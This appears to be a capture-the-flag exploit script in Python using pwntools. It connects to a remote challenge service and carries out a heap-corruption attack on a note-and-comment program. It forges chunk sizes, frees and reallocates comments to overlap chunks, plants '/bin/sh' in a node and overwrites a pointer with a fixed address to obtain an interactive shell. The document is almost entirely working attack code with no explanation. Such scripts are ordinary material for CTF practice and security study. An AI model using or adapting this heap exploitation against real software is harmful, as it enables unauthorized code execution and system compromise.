from pwn import *

#r = process('./heap')
r = remote('heapxheap.eatpwnnosleep.com', 20000)

def create_node(msg):
    r.sendlineafter('MENU> ', '1')
    r.sendlineafter('NOTE : ', msg)

def write_cmt(idx, size, cmt):
    r.sendlineafter('MENU> ', '3')
    r.sendlineafter('> ', str(idx))
    r.sendlineafter('> ', str(size))
    r.sendafter('> ', cmt)

def del_cmt(idx):
    r.sendlineafter('MENU> ', '4')
    r.sendlineafter('> ', str(idx))

def edit_cmt(idx, cmt):
    r.sendlineafter('MENU> ', '5')
    r.sendlineafter('> ', str(idx))
    r.sendafter('> ', cmt)

def setpass(passwd):
    r.sendlineafter('MENU> ', '8')
    r.sendlineafter('55)\n', passwd)
    
create_node('a')#1
create_node('b')#2
create_node('c')#3
create_node('d')#4

write_cmt(1, 0x38, 'a')
write_cmt(2, 0x1e0, 'a'*0xf0+p64(0x100))
write_cmt(3, 0x1b0, 'barrier')
del_cmt(1)
del_cmt(2)
setpass('ToE_heap'.ljust(56, 'b'))
write_cmt(1, 0x80, 'a')
write_cmt(2, 0x60, 'b'*16)
del_cmt(1)
del_cmt(3)
create_node('/bin/sh\x00')#5
edit_cmt(2, p64(0x400ad0))



pause()
r.interactive()
